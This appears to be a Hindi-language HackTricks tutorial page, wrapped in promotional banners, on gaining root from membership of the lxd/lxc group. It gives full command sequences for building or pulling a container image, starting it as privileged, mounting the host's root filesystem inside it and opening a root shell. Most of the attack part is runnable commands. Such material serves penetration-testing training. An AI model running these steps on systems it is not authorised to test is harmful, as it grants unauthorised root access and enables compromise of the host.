<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>


यदि आप _**lxd**_ **या** _**lxc**_ **समूह के सदस्य हैं**, आप रूट बन सकते हैं

# इंटरनेट के बिना शोषण

आप अपनी मशीन में यह डिस्ट्रो बिल्डर इंस्टॉल कर सकते हैं: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) \(github के निर्देशों का पालन करें\):
```bash
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
cd
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
```
फिर, सर्वर पर **lxd.tar.xz** और **rootfs.squashfs** फाइलें अपलोड करें

इमेज जोड़ें:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```
कंटेनर बनाएं और रूट पथ जोड़ें
```bash
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
कंटेनर को निष्पादित करें:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
# इंटरनेट के साथ

आप [इन निर्देशों](https://reboare.github.io/lxd/lxd-escape.html) का पालन कर सकते हैं।
```bash
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
# अन्य संदर्भ

{% embed url="https://reboare.github.io/lxd/lxd-escape.html" caption="" %}



<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर **मुझे फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके.

</details>
